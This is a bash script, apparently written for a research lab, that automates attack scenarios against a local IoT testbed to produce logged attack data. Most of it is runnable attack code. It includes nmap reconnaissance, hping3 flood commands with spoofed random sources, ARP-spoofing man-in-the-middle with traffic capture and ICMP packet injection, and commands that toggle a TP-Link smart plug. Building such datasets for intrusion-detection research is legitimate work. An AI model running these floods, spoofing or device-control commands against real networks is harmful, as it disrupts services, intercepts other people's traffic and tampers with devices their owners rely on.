#!/bin/bash

me=$$
i=0

: 'Scenario 1 : network scanning 
This scenario represents the pure reconnaisance attack in which the attacker wants to simply acquire information about the hosts on the network.
In this scenario, we assume that the attacker is already connected to the targeted network and that the attacker knows the subnet that he wants to scan.

The attacker will usually commence his reconnaisance with a quick scan. This is done to just quickly scan the network, identifying which hosts are present on the network and acquiring information on potential hints on where to search for further vulnerabilities / plan further scan / plan next attack actions or simply acquire general information without leaving much footprint on the network to potentially resume his actions later.

After performing a quick scan, the attacker might also want to perform a long, in-depth scan of the network to identify further vulnerabilities (that might have not beed found in the initial quick scan. Likewise, the attacker might want to target specific hosts rather than targeting the whole range on the subnet. The latter is not included in automation but might be configured manually in the script if needed by altering the list of long scans defined in the main loop. 

This script performs the quick scan by choosing one random scan from the list of quick scans (arrQUICK) defined in the main loop. Then it proceeds to the long scan with probability 0.5. If peoceeding to random scan, the next scan is chosen randomly from the list of long scans (arrLONG) defined in the main loop.

This attack scenario:
  - picks a random quick scan from the list specified in the main loop (arrQUICK)
  - performs the quick scan, saves xml results of the scan in the ./scenarios_output/nmap_results_xmls directory
  - terminates or proceeds to the long scan with probability 0.5
  - picks a random long scan from the list specified in the main loop (arrLONG)
  - performs the long scan, saves xml results of the scan in the ./scenarios_output/nmap_results_xmls directory
  - saves terminal output to scenarios_output/scenarios_terminal_output.txt
  - saves summaries/logs attack details in scenarios_output/scenarios_log.txt'
function scenario1 {
    i=$1

    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf " \nIteration:$1 Scenario:1 = Scanning\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    
    #pick random quick scan from the quick scans list defined in arrQUICK in the main loop
    RANDOM=$$$(date +%s)
    Random_QUICK=${arrQUICK[$RANDOM % ${#arrQUICK[@]} ]}
    
    #perform quick scan 
    start_quick=$(date "+%Y.%m.%d-%H.%M.%S")
    printf " A) Nmap quick scan\n  *$start_quick : $Random_QUICK\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    echo $(eval $Random_QUICK)
    stop_quick=$(date "+%Y.%m.%d-%H.%M.%S")


    #pick random long scan (regular or intense) from the long scans list defined in arrLONG in the main loop
    RANDOM=$$$(date +%s)
    Random_LONG=${arrLONG[$RANDOM % ${#arrLONG[@]} ]}
    
    #decide if doing further scans 
    rand=$(shuf -i1-2 -n1) #0.5 probability

    if [ "$rand" = "1" ]; then
        #peforming a long scan
        rand=$(shuf -i1-120 -n1) #wait random time (1 sec to 2 mins before launching the next scan - time for scan analysis)
        
        printf "/nrandom is : $rand/n"
        start_long=$(date "+%Y.%m.%d-%H.%M.%S")
        printf " B) Nmap long scan\n  *$start_long : $Random_LONG" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        echo $(eval $Random_LONG)
        stop_long=$(date "+%Y.%m.%d-%H.%M.%S")
    else
        #not performing a long scan
        Random_LONG="not applicable"
        start_long="not applicable"
        stop_long="not applicable"
    fi


    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")

    #print summary for scanning attack with: id, scenatio, start, stop, random quick - type, start, stop, random long - type, start, stop
    printf "\n\n$1) Scenario 1 \n *start: $start_current_time \n *stop: $stop_current_time \n *executed: \n **$Random_QUICK \n ***start: $start_quick\n ***stop: $stop_quick\n **$Random_LONG \n ***start: $start_long\n ***stop: $stop_long\n" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt
}




: 'Scenario 2 : Network scanning + denial(s) of service 
This scenario represents a quick reconnaissance followed by one (or more) of the most popular denial of service attacks. The attacker in this scenario performs a quick scanning (with one of the most popular nmap scans) to acquire information about the hosts present on the network as well as to discover information on open ports or other vulnerabilities. 

After performing a quick scan, the attacker applies one of the most popular/standard DoS floods on one of the target devices. The attacker might try one or more floods on the same device, one flood on all devices or a mix of floods on a mix of devices. 

This script performs the quick scan by choosing one random scan from the list of quick scans (arrQUICK) defined in the main loop. After that, a random number of denial of service attempts is picked. In this case the rationale is that there are six devices on the network so the random number of iterations is between 1 and 6 (inclusive) but this could be altered to cater for specific needs/more devices. In each iteration of the DoS loop, a script will wait for a random amount of time from 1 second to 2 minutes (as the attacker might not execute the scanning and DoS one after another (especially if performing these manually, not in the the script). After that, random DoS attack is chosen fromt he list of most popular DoS attacks defined in the main script execution loop (arrDOS). A random IP is chosen from the IPs list defined at the beginning of script execution. This IP will be the target of the DoS attack. 

This attack scenario:
  - picks a random quick scan from the list specified in the main loop (arrQUICK)
  - performs the quick scan, saves xml results of the scan in the ./scenarios_output/nmap_results_xmls directory
  - chooses random amount of repetitions of the DoS attack (from 1 to 6)
  - in each iteration of the loop:
    - sleeps random amount of time (from 1 second to 2 minutes)
    - picks a random DoS attack from the list specified in the main loop (arrDOS)
    - performs the DoS attack as a background process
    - randomly picks the duration of the DoS (from 30 seconds to 5 minutes) 
    - kills the background process with the DoS after the previously selected random duration time
  - saves terminal output to scenarios_output/scenarios_terminal_output.txt
  - saves summaries/logs attack details in scenarios_output/scenarios_log.txt


mental notes:
  - go through the xml results and see what ports are open on each device - to justify the list of dos attacks chosen, the ones currently specified might seem a bit random, would be much better if I could adjust them to the identified vulnerabilities.
  - shall I run the dos as nohup instead? verify - test thoroughly'
function scenario2 {
    i=$1

    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf " \nIteration:$1 Scenario:2 = DoS\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    

    #pick random quick scan from the quick scans list defined in arrQUICK in the main loop
    RANDOM=$$$(date +%s)
    Random_QUICK=${arrQUICK[$RANDOM % ${#arrQUICK[@]} ]}
    
    #perform quick scan
    start_quick=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "\n A) Nmap quick scan\n  *$start_quick : $Random_QUICK\n\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    echo $(eval $Random_QUICK)
    stop_quick=$(date "+%Y.%m.%d-%H.%M.%S")


    #pick n repetitions of the Denial of Service (repetitions of DoS in general, not repetitions of one specific flood, flood chosen randomly)
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 6 DELETE
    rand_repetitions=$(shuf -i1-6 -n1) #1 to 6 as currently 6 devices - the attacker might want to try to flood all of them or less

    performedDOS=()

    printf "\n\n DOS will be executed $rand_repetitions times...\n\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    #execute the repeated denial of service
    for (( c=1; c<=$rand_repetitions; c++ ))
    do 
        #sleep for random amount of time
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  120 DELETE
        rand_sleep=$(shuf -i1-120 -n1) #choose 1 second to 2 minutes 
        printf "Sleeping for $rand_sleep seconds..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        sleep $rand_sleep

        #pick random DoS attack from the arrDOS list defined in the main loop
        RANDOM=$$$(date +%s)
        Random_DOS=${arrDOS[$RANDOM % ${#arrDOS[@]} ]}

        #pick random IP from the arrIPS identified at the beginning of the script execution
        RANDOM=$$$(date +%s)
        Random_IP=${arrIPS[$RANDOM % ${#arrIPS[@]} ]}

#TBP!!
        #perform the DoS attack for random time - not logged in the main log for now, need to create an empty array and add them plus log times, maybe a tuple/dictionary?
        start_DOS=$(date "+%Y.%m.%d-%H.%M.%S")
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 300 DELETE
        rand_duration=$(shuf -i30-300 -n1) #execute dos for random time from 30 seconds to 5 minutes

        printf "\n B$c) DOS\n  *$start_quick : $Random_DOS$Random_IP for $rand_duration seconds\n\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt

        
        printf $(eval $Random_DOS$Random_IP) & scriptDOS=$! #run DoS as a background process

        sleep $rand_duration
        kill $scriptDOS 
        killall hping3 #to ensure that it was killed
        stop_DOS=$(date "+%Y.%m.%d-%H.%M.%S")

        performed_DOS+=("start: $start_DOS - stop: $stop_DOS - attack: $Random_DOS$Random_IP duration: $rand_duration seconds") 
    done 
    

    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
#TBP!! - array to print all DoS'es performed along with the time for each DoS, the random time waited before each DoS etc - more complicated array (save all three as one item)
    #print summary - change for DoS
    printf "\n\n$1) Scenario 2 \n *start: $start_current_time \n *stop: $stop_current_time \n *A)Nmap scanning: \n **$Random_QUICK \n ***start: $start_quick\n ***stop: $stop_quick\n *B)DoS: \n **iterations: $rand_repetitions\n" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt

printf ' ***%s\n' "${performed_DOS[@]}" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt

}




: 'Scenario 3 : Network scanning + Man in the middle
This scenaro represents a quick reconnaissance followed by a Man-In-The-Middle attack performed via ARP spoofing. The attacker in this scenario performs a quick scanning (with one of the most popular nmap scans) to acquire information about the hosts present on the network as well as to discover information on open ports or other vulnerabilities. 

After performing a quick scan, the attacker performs one of the two variants of the arpspoof man-in-the-middle attacks: passive monitoring or packet injection. In passive monitoring, the attacker is simply sniffing on the network traffic between the router and the random target device. Packet injection variant involves an active attacker in which he is injecting ICMP packets. One of these two variants is chosen at random, each with 1/2 probability. 

Potentially, other packets could be injected as well. For the time being, these are only ICMP packets. Packet injection is performed in send_ICMP.py script which uses scapy to craft and inject packets. 

This attack scenario:
  - picks a random quick scan from the list specified in the main loop (arrQUICK)
  - performs the quick scan, saves xml results of the scan in the ./scenarios_output/nmap_results_xmls directory
  - waits random amount of time before embarking on the MITM attack (from 1 second to 2 minutes)
  - picks random IP address to be the target of the attack (from the list of valid IP addresses defined in the main loop)
  - randomly chooses one of the variants - passive monitoring or packet injection (1/2 probability each)
  - sets up IP forwarding to enable MITM (to accept packets that are not destined at the attacker device)
  - performs arpspoof on the victim and the router (tells victim that he is a router and tells router that he is a victim)
  - depending on the variant chosen:
    - for passive monitoring, starts tcpdump in the middle of the communication
    - for packet injection: 
      - starts tcpdump in the middle of communication
      - waits random time before injection of any packet from 10 seconds to 2 minutes
      - picks random amount of packets to inject
      - after each injection it sleeps for random duration from 1 second to 1 minute
      - waits random time after injection of all packets is finished from 10 seconds to 2 minutes
  - kills all arpspoof/tcpdump processes running
  - disables IP forwarding
  - saves terminal output to scenarios_output/scenarios_terminal_output.txt
  - saves summaries/logs attack details in scenarios_output/scenarios_log.txt'
function scenario3 {
    i=$1

    router="192.168.200.1"
    Arpspoof="nohup arpspoof -i wlan0 -t " #nohup to run it in the background 
    sep=" "
    noout=" &>/dev/null &"
    Inject_packet="python send_ICMP.py "


    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf " \nIteration:$1 Scenario:3 = MITM\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt


    #pick random quick scan from the quick scans list defined in arrQUICK in the main loop
    RANDOM=$$$(date +%s)
    Random_QUICK=${arrQUICK[$RANDOM % ${#arrQUICK[@]} ]}
    
    #perform quick scan
    start_quick=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "\n A) Nmap quick scan\n  *$start_quick : $Random_QUICK\n\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    echo $(eval $Random_QUICK)
    stop_quick=$(date "+%Y.%m.%d-%H.%M.%S")


    #random wait time
    rand_sleep=$(shuf -i1-120 -n1) #choose 1 second to 2 minutes 
    printf "Sleeping for $rand_sleep seconds ... " 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    sleep $rand_sleep

    #pick random IP from the arrIPS identified at the beginning of the script execution
    RANDOM=$$$(date +%s)

    arrIPS=($2)
    printf "\nChecking on arrIPS ...\n"
    printf ' *%s\n' "${arrIPS[@]}" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt

    Random_IP=${arrIPS[$RANDOM % ${#arrIPS[@]} ]}
    

    #probability passive monitoring vs packet injection
    rand_probability=$(shuf -i1-2 -n1) #choose 1 of he two attacks with probability 1/2 of passive monitoring and 1/2 of packet injection

    start_MITM=$(date "+%Y.%m.%d-%H.%M.%S")
    rand_duration=$(shuf -i30-300 -n1) #execute dos for random time from 30 seconds to 5 minutes??????????????????????????????????????????????? is it used ?????????????????

    #set up IP forwarding
    printf "\nSetting IP forwarding..."
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

    #Arpspoof the victim (target's IP)
    printf "\nExecuting : $Arpspoof$Random_IP$sep$router$noout\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    printf $(eval $Arpspoof$Random_IP$sep$router$noout)

    #Arpspoof the router (router's IP)
    printf "\nExecuting : $Arpspoof$router$sep$Random_IP$noout\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    printf $(eval $Arpspoof$router$sep$Random_IP$noout)
    
    #perform the steps from each depending on probability chosen (if else)
    if [ "$rand_probability" = "1" ]; then #passive monitoring
        #steps from passive monitoring
        MITM_type="passive monitoring"
        printf "\nExecuting : TCPDUMP $i - $Random_IP\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        Tcpdump="tcpdump -i wlan0 -s 65535 -w ./scenarios_output/arpspoof_tcpdump/tcpdump-passive$i-$Random_IP.pcap"
        printf $(eval $Tcpdump) & scriptTCPDUMP=$!
        Random_Num_Packets="not applicable"
        #add random exexution time

    else 
        #steps from packet injection
        MITM_type="packet injection"
        printf "\nExecuting : TCPDUMP $i - $Random_IP\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        Tcpdump="tcpdump -i wlan0 -s 65535 -w ./scenarios_output/arpspoof_tcpdump/tcpdump-injection$i-$Random_IP.pcap"
        printf $(eval $Tcpdump) & scriptTCPDUMP=$!
        
        Random_Time_BeforeInj=$(shuf -i10-120 -n1) #from 10 sec to 30 sec
        printf "\nAttack duration before injection: $Random_Time_BeforeInj\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        sleep $Random_Time_BeforeInj #change to Random_Time
        
        #injection - random number of ICMP packets with random breaks in between each of them
        Random_Num_Packets=$(shuf -i1-50 -n1) #1 to 50
        for (( c=1; c<=$Random_Num_Packets; c++ ))
        do  
            injection_time=$(date "+%Y.%m.%d-%H.%M.%S")
            #if more packets to be injected - could add an if-else with random choice of the packet to be injected
            printf "\n *$injection_time Injecting ICMP packet $c out of $Random_Num_Packets ..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
            printf $(eval $Inject_packet$Random_IP) & scriptInject=$!
            sleep 1
            kill $scriptInject
            Random_InBetween_Sleep=$(shuf -i1-60 -n1) #from 1 sec to 60 sec
            printf "\n  Sleeping for $Random_InBetween_Sleep ..."
            sleep $Random_InBetween_Sleep
        done

        Random_Time_AfterInj=$(shuf -i10-120 -n1) #from 10 sec to 5 min
        printf "\n Attack duration after injection: $Random_Time_AfterInj\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        sleep $Random_Time_AfterInj 
    fi

    printf "\nFinishing the attack...\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    printf "\nKilling all arpspoof...\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    killall arpspoof 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    printf "\nKilling $scriptTCPDUMP...\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    kill $scriptTCPDUMP 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    printf "\nKilling all tcpdump - to reassure...\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    killall tcpdump 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    
    #disable IP forwarding
    printf "\nDisabling IP forwarding..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward  

    #logging

    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "\n\n$1) Scenario 3 Network Scanning + MITM\n *start: $start_current_time \n *stop: $stop_current_time \n *A)Nmap scanning: \n **$Random_QUICK \n ***start: $start_quick\n ***stop: $stop_quick\n *B)MITM: \n **type: $MITM_type \n **number of packets injected: $Random_Num_Packets" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt 

}



: 'Scenario 4 : Attack on the TP-Link plug with iot-toolkit
This scenaro represents the IoT-specific attack which uses the iot-toolkit framework by Fernando Gont. It targets the TP-Link devices for reconnaissance and performs toggle/get_info on the TP-Link smart plug. 
'
function scenario4 {

    i=$1
    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf " \nIteration:$1 Scenario:4 = iot-toolkit\n" 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt


    #three types of attacks in the framework
    iot_scanning="./iot-scan -i wlan0 -L 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt"
    iot_get_info="./iot-tl-plug -L -i wlan0 -c get_info 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt"
    iot_toggle="./iot-tl-plug --toggle 192.168.200.146" #type in the ip of the plug manually

    #parameters for toggle attack
    rand_intensity=$(shuf -i50-500 -n1)
    rand_time=$(shuf -i30-360 -n1)
    hash_sign="#"
    toggle_command=$x3$hash_sign$rand_intensity$hash_sign$rand_time

    #choose random variant
    rand_variant=$(shuf -i1-4 -n1) 
    

    if [ "$rand_variant" = "1" ]; then #scanning only
        current_time=$(date "+%Y.%m.%d-%H.%M.%S")
        printf "$current_time Performing scanning with iot-toolkit..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        printf $(eval $iot_scanning)
        x_current="Scanning only"
    elif [ "$rand_variant" = "2" ]; then #scanning + get_info
        printf "$current_time Performing scanning and get_info with iot-toolkit..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        printf $(eval $iot_scanning)
        printf $(eval $iot_get_info)
        x_current="Scanning + get_info"
    elif [ "$rand_variant" = "3" ]; then #scanning + toggle
        printf "$current_time Performing scanning and toggle(intensity:$rand_intensity, time:$rand_time) with iot-toolkit..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        printf $(eval $iot_scanning)
        printf $(eval $toggle_command)
        x_current="Scanning + toggle"
    elif [ "$rand_variant" = "4" ]; then #scanning + get_info + toggle
        printf "$current_time Performing scanning and toggle(intensity:$rand_intensity, time:$rand_time) with iot-toolkit..." 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt
        printf $(eval $iot_scanning)
        printf $(eval $iot_get_info)
        printf $(eval $toggle_command)
        x_current="Scanning + get_info + toggle"
    else
        printf "error in variants choice - do nothing"
    fi
    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")

    #logs
    printf "\n\n$1) Scenario 4 \n *start: $start_current_time \n *stop: $stop_current_time \n *type: $x_current" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt 

}


#get the IPs on the network
IPS=$(nmap -n -sn 192.168.200.0/24 -oG - | awk '/Up$/{print $2}')
init_arrIPS=($IPS)

#hardcode router's IP
router="192.168.200.1"

#initial mapping of IP to MAC addresses for debugging
printf "Initial verification of IPs and MACs: \n" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt
sudo arp-scan 192.168.200.0/24 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt
printf "\n\n"

#verify IPs for the attack
printf "\nInitial IPs scan:\n" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt
printf ' *%s\n' "${init_arrIPS[@]}" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt

printf "\n\n"


#delete restricted IP addresses from the list (devices that should not be targeted in the attacks)
#mapfile -d $'\0' -t arrIPS < <(printf '%s\0' "${arrIPS[@]}" | grep -Pzv "^192.168.200.1$") #router
#mapfile -d $'\0' -t arrIPS < <(printf '%s\0' "${arrIPS[@]}" | grep -Pzv "^192.168.200.2$") #firewall/syslog
#mapfile -d $'\0' -t arrIPS < <(printf '%s\0' "${arrIPS[@]}" | grep -Pzv "^192.168.200.3$") #firewall/syslog
#mapfile -d $'\0' -t arrIPS < <(printf '%s\0' "${arrIPS[@]}" | grep -Pzv "^192.168.200.134$") #attacker's computer in the lab
#mapfile -d $'\0' -t arrIPS < <(printf '%s\0' "${arrIPS[@]}" | grep -Pzv "^192.168.200.133$") #Kali virtual machine on Gosia's laptop

#https://stackoverflow.com/questions/16860877/remove-element-from-array-shell

#the below doesnt work - deletes the whole 192.168.200.1 sequence pattern from every element
#declare -a new_arrIPS=( ${arrIPS[@]/192.168.200.134/} )
#new_arrIPS1=( ${new_arrIPS[@]/^192.168.200.1$/} )
#echo ${new_arrIPS1[@]}


#the loop below works to restrict the array elements!! finally...
arrIPS=()
arr_restricted=("192.168.200.1" "192.168.200.2" "192.168.200.3" "192.168.200.134")
for i in "${init_arrIPS[@]}"
do
   if [[ " ${arr_restricted[*]} " == *" $i "* ]]; then
       echo "$i discarded"
   else 
       arrIPS+=("$i")
   fi
done


printf "\nIPs for attacks:\n" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt

printf ' *%s\n' "${arrIPS[@]}" 2>&1 | tee -a scenarios_output/scenarios_log.txt -a scenarios_output/scenarios_terminal_output.txt





i=0

#main loop
while true
do
    i=$((i+1))

    #list of quick scanning attacks
    arrQUICK=("sudo nmap -T4 -F -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-quick.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -sn -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-ping.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -sn --traceroute -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-quick_traceroute.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -sV -T4 -O -F --version-light -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-quickscan_plus.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt")

    #list of long scanning attacks
    arrLONG=("sudo nmap -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-regular.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -T4 -A -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-intense.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -sS -sU -T4 -A  -v -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-intense_plus_udp.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -T4 -A -v -Pn -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-intense_noping.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt" "sudo nmap -p 1-65535 -T4 -A -v  -oX ~/Desktop/ATTACKS/scenarios_output/nmap_results_xmls/scan$i-intense_allTCPports.xml 192.168.200.1-254 2>&1 | tee -a scenarios_output/scenarios_terminal_output.txt")

    #list of denial of service attacks
    arrDOS=("sudo hping3 -1 --flood --rand-source " "sudo hping3 -1 -C 3 -K 3 --flood --rand-source " "sudo hping3 -d 3000 --flood --frag -p 80 -S " "sudo hping3 --flood -d 3000 --frag --rand-source -p 80 -A " "sudo hping3 --flood -d 3000 --frag --rand-source -p 80 -R " "sudo hping3 --flood -d 3000 --rand-source -p 80 -F -S -R -P -A -U -X -Y " "sudo hping3 --flood --rand-source --udp --sign 'GGFlood' -p 80 ")
#pick random attack number

    printf "\n Executing Main Loop\n"
    scenario3 $i $arrIPS#how to call an attack
#if else

    sleep 5s
done






